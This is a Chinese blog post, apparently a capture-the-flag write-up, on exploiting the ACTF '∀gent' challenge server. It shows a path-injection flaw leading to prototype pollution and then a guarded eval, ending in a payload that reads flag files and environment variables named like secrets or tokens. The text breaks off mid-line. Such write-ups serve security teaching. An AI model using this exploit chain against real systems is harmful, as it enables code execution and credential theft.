@@ -1,0 +1,1019 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/Cropped_Image.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="mu2he">
+  <meta name="keywords" content="muzhe">
+  
+    <meta name="description" content="ACTF∀gent题目一开始没给附件，就给了个容器。 进去之后是让我们上传一个 zip ，然后就可以和 agent 聊天？稍微试探一下会吐出假的 flag ， ACTF{WuYan_1s_4_b19_Turt13_N07_7h3_F1n41_Fl4g} 后面题目又给了一个附件。 附件结构： 1234567891011server.jspublic&#x2F;app.jssrc&#x2F;storage&#x2F;db.json">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF">
+<meta property="og:url" content="https://mu2he.me/post/ACTF/index.html">
+<meta property="og:site_name" content="mu2he&#39;s blog">
+<meta property="og:description" content="ACTF∀gent题目一开始没给附件，就给了个容器。 进去之后是让我们上传一个 zip ，然后就可以和 agent 聊天？稍微试探一下会吐出假的 flag ， ACTF{WuYan_1s_4_b19_Turt13_N07_7h3_F1n41_Fl4g} 后面题目又给了一个附件。 附件结构： 1234567891011server.jspublic&#x2F;app.jssrc&#x2F;storage&#x2F;db.json">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-13T01:46:25.000Z">
+<meta property="article:modified_time" content="2026-05-13T02:59:39.239Z">
+<meta property="article:author" content="mu2he">
+<meta property="article:tag" content="muzhe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ACTF - mu2he&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mu2he.me","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>mu2he</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/train.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ACTF"></span>
+          
+        </div>
+
+
+	
+
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-05-13 09:46" pubdate>
+          2026年5月13日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          96 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ACTF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="ACTF"><a href="#ACTF" class="headerlink" title="ACTF"></a>ACTF</h2><h4 id="∀gent"><a href="#∀gent" class="headerlink" title="∀gent"></a>∀gent</h4><p>题目一开始没给附件，就给了个容器。</p>
+<p>进去之后是让我们上传一个 zip ，然后就可以和 agent 聊天？<br>稍微试探一下会吐出假的 flag ，</p>
+<p>ACTF{WuYan_1s_4_b19_Turt13_N07_7h3_F1n41_Fl4g}</p>
+<p>后面题目又给了一个附件。</p>
+<p>附件结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">server.js<br>public/app.js<br>src/<br>storage/db.json<br>storage/tenants/workspace/main-agent.yaml<br>storage/repositories/<br>vendor/<br>vendor/candidate-yaml-update-action/<br>vendor/expr-eval/<br>vendor/jsonpath-plus/<br>vendor/jmespath-js/<br></code></pre></td></tr></table></figure>
+
+<p>看看他的聊天接口：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/workspaces/:id/chat&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-title function_">assertChatPayload</span>(req.<span class="hljs-property">body</span>);<br>  ...<br>&#125;);<br>    <br>    <br><span class="hljs-keyword">const</span> payload = &#123;<br>  <span class="hljs-attr">instruction</span>: <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">instruction</span> || <span class="hljs-string">&quot;...&quot;</span>),<br>  <span class="hljs-attr">scope</span>: <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">scope</span> || <span class="hljs-string">&quot;release&quot;</span>),<br>  <span class="hljs-attr">environment</span>: <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">environment</span> || workspace.<span class="hljs-property">environment</span> || <span class="hljs-string">&quot;staging&quot;</span>),<br>  <span class="hljs-attr">section</span>: <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">section</span> || <span class="hljs-string">&quot;image&quot;</span>),<br>  <span class="hljs-attr">field</span>: <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">field</span> || <span class="hljs-string">&quot;tag&quot;</span>),<br>  <span class="hljs-attr">value</span>: <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">value</span> || <span class="hljs-string">&quot;v1.0.4-rc1&quot;</span>),<br>&#125;;    <br>    <br></code></pre></td></tr></table></figure>
+
+<p>聊天的参数会强制转字符串，没找到能打的地方。</p>
+<p>传入的 value ：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">value</span>: &#123;<br>  <span class="hljs-attr">anyOf</span>: [&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;string&quot;</span> &#125;, &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;number&quot;</span> &#125;, &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;boolean&quot;</span> &#125;],<br>&#125;,<br></code></pre></td></tr></table></figure>
+
+<p>也只接受字符串、数字、布尔值。</p>
+<p>但是这边有个 override 接口：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/projects/:id/agent/override&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> job = <span class="hljs-keyword">await</span> <span class="hljs-title function_">runOverrideJob</span>(req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">202</span>).<span class="hljs-title function_">json</span>(&#123; job &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>这里可以传任意的 JSON ，value 也能放对象。</p>
+<p>所以我们追踪一下这个 override</p>
+<p>看 src&#x2F;job-runner.js：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">const propertyPath <span class="hljs-operator">=</span> buildPropertyPath(payload)<span class="hljs-comment">;</span><br>const patchValue <span class="hljs-operator">=</span> buildPatchValue(payload)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>还有 src&#x2F;path-builder.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeSegment</span>(<span class="hljs-params">input, fallback</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> input !== <span class="hljs-string">&quot;string&quot;</span> || !input.<span class="hljs-title function_">trim</span>()) &#123;<br>    <span class="hljs-keyword">return</span> fallback;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> input.<span class="hljs-title function_">trim</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">buildPropertyPath</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">const</span> scope = <span class="hljs-title function_">sanitizeSegment</span>(request.<span class="hljs-property">scope</span>, <span class="hljs-string">&quot;release&quot;</span>);<br>  <span class="hljs-keyword">const</span> environment = <span class="hljs-title function_">sanitizeSegment</span>(request.<span class="hljs-property">environment</span>, <span class="hljs-string">&quot;staging&quot;</span>);<br>  <span class="hljs-keyword">const</span> section = <span class="hljs-title function_">sanitizeSegment</span>(request.<span class="hljs-property">section</span>, <span class="hljs-string">&quot;image&quot;</span>);<br>  <span class="hljs-keyword">const</span> field = <span class="hljs-title function_">sanitizeSegment</span>(request.<span class="hljs-property">field</span>, <span class="hljs-string">&quot;tag&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`agentProfile.scopes.<span class="hljs-subst">$&#123;scope&#125;</span>.environments.<span class="hljs-subst">$&#123;environment&#125;</span>.<span class="hljs-subst">$&#123;section&#125;</span>.<span class="hljs-subst">$&#123;field&#125;</span>`</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">buildPatchValue</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">return</span> request.<span class="hljs-property">value</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个点：</p>
+<p>sanitizeSegment() 只是判断是不是字符串，然后 trim()，没有过滤点号 .，也没有过滤危险 key。</p>
+<p>也就是说，正常路径是：</p>
+<p>agentProfile.scopes.release.environments.staging.image.tag</p>
+<p>但如果让：</p>
+<p>field &#x3D; “a.b.c”</p>
+<p>最终路径就变成：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">agentProfile<span class="hljs-selector-class">.scopes</span><span class="hljs-selector-class">.release</span><span class="hljs-selector-class">.environments</span><span class="hljs-selector-class">.staging</span><span class="hljs-selector-class">.image</span><span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.b</span>.c<br></code></pre></td></tr></table></figure>
+
+<p>这说明我们可以通过 field 注入额外路径层级。</p>
+<p>然后看一看 propertyPath 被谁用了。</p>
+<p>agent loop 里调用：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">tool:</span> <span class="hljs-string">&quot;config.diff&quot;</span>,<br><span class="hljs-params">args:</span> &#123; propertyPath, <span class="hljs-params">value:</span> patchValue &#125;,<br></code></pre></td></tr></table></figure>
+
+<p> src&#x2F;tool-registry.js 里：</p>
+<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-string">&quot;config.diff&quot;</span>: (&#123; propertyPath, value &#125;) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-built_in">result</span> = applyChanges(filePath, &#123; [propertyPath]: value &#125;);<br>  <span class="hljs-keyword">return</span> &#123;<br>    changed: <span class="hljs-built_in">result</span>.changed,<br>    format: <span class="hljs-built_in">result</span>.format,<br>    before: <span class="hljs-built_in">result</span>.before,<br>    after: <span class="hljs-built_in">result</span>.after,<br>  &#125;;<br>&#125;,<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">applyChanges(filePath, &#123;<br>  <span class="hljs-selector-attr">[propertyPath]</span>: value<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>src&#x2F;config-engine.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">applyChanges</span>(<span class="hljs-params">filePath, valueUpdates, options = &#123;&#125;</span>) &#123;<br>  ...<br>  <span class="hljs-keyword">const</span> changedFile = upstream.<span class="hljs-title function_">processFile</span>(<br>    path.<span class="hljs-title function_">basename</span>(filePath),<br>    valueUpdates,<br>    actionOptions,<br>    actionLogger<br>  );<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>它把更新逻辑丢给了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vendor/candidate-yaml-update-action<br></code></pre></td></tr></table></figure>
+
+<p>继续跟踪就能看到核心写入：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jsonpath.value(copy, </span><span class="hljs-keyword">jsonPath, </span>value);<br></code></pre></td></tr></table></figure>
+
+<p>所以这里可以有原型污染。</p>
+<p>因为最终路径是：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">agentProfile<span class="hljs-selector-class">.scopes</span><span class="hljs-selector-class">.release</span><span class="hljs-selector-class">.environments</span><span class="hljs-selector-class">.staging</span><span class="hljs-selector-class">.image</span>.$&#123;field&#125;<br></code></pre></td></tr></table></figure>
+
+<p>污染 Object.prototype.policy 就能控制</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">formula</span><br><span class="hljs-attribute">bindingProfile</span><br><span class="hljs-attribute">resultProfile</span><br><span class="hljs-attribute">selectorProfile</span><br><span class="hljs-attribute">exposeDebugContext</span><br></code></pre></td></tr></table></figure>
+
+<p>在 executeFormulaExpression() 里：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">result</span> = <span class="hljs-keyword">eval</span>(`(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$&#123;argNames.join(<span class="hljs-params"><span class="hljs-string">&#x27;,&#x27;</span></span>)&#125;</span>) </span>&#123; <span class="hljs-keyword">return</span> ($&#123;expression&#125;); &#125;)`)(<br>  ...argValues<br>);<br></code></pre></td></tr></table></figure>
+
+<p>这就是污染最后的 eval</p>
+<p>但是这个 eval 被加了限制</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (verdict.<span class="hljs-literal">blocked</span>Count &gt; <span class="hljs-number">0</span>) &#123;<br>  <span class="hljs-attribute">if</span> (!allowCompatInterpreter) &#123;<br>    <span class="hljs-attribute">throw</span> new Error(<span class="hljs-string">&quot;strict numeric formula validation failed&quot;</span>);<br>  &#125;<br>  <span class="hljs-attribute">return</span> executeFormulaExpression(...);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>会拦截，然后 bindingProfile 默认的 lock 需要改为 compat：</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveBindingProfile</span><span class="hljs-params">(profile)</span> &#123;<br>  <span class="hljs-keyword">switch</span> (String(profile || <span class="hljs-string">&quot;&quot;</span>)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;locked&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;sealed&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;compat&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>还有 eval 的返回结果也有校验，如果返回字符串，会报 error</p>
+<p>所以还要把 resultProfile 设置为 wide</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveResultProfile</span><span class="hljs-params">(profile)</span> &#123;<br>  <span class="hljs-keyword">switch</span> (String(profile || <span class="hljs-string">&quot;&quot;</span>)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;compact&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;wide&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;decimal&quot;</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>最后在控制台跑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">formula</span> = `(()=&gt;&#123;<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fs</span>=<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">p</span> of [<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-string">&#x27;/FLAG&#x27;</span>,<span class="hljs-string">&#x27;/app/flag&#x27;</span>,<span class="hljs-string">&#x27;/app/FLAG&#x27;</span>,<span class="hljs-string">&#x27;/tmp/flag&#x27;</span>,<span class="hljs-string">&#x27;/tmp/FLAG&#x27;</span>,<span class="hljs-string">&#x27;/workspace/flag&#x27;</span>,<span class="hljs-string">&#x27;/workspace/FLAG&#x27;</span>])&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">if</span>(fs.<span class="hljs-title function_ invoke__">existsSync</span>(p))<span class="hljs-keyword">return</span> fs.<span class="hljs-title function_ invoke__">readFileSync</span>(p,<span class="hljs-string">&#x27;utf8&#x27;</span>)&#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;&#125;<span class="hljs-keyword">return</span> Object.<span class="hljs-title function_ invoke__">entries</span>(process.env).<span class="hljs-title function_ invoke__">filter</span>(([k])=&gt;/flag|ctf|actf|secret|token/i.<span class="hljs-title function_ invoke__">test</span>(k)).<span class="hljs-title function_ invoke__">map</span>(([k,v])=&gt;k+<span class="hljs-string">&#x27;=&#x27;</span>+v).<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;\\n&#x27;</span>)&#125;)()`;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">res</span> = await <span class="hljs-title function_ invoke__">fetch</span>(<span 